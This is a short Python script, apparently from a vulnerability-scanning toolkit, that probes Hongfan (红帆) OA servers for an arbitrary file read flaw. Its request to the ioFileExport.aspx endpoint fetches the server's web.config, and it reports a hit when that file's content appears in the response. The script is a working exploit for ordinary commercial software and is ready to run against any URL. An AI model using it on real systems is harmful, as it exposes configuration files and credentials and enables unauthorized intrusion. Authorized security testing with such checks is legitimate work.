#!/usr/bin/env python
# coding=utf-8
#红帆OA任意文件读取漏洞
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url + '/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream', verify=False,timeout=20)
        bm=response.encoding #获取网页编码
        response.encoding = bm #设置网页编码
        if 'MemcachedCacheProvider' in response.text or '文件不存在！' in response.text :
            print(colored('[+]存在红帆OA任意文件读取漏洞', 'red'))
            results = f'{urls}-->存在红帆OA任意文件读取漏洞'
        else:
            print('[-]不存在红帆OA任意文件读取漏洞')
    except:
        print('[-]不存在红帆OA任意文件读取漏洞')


def hongfOAdile(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results


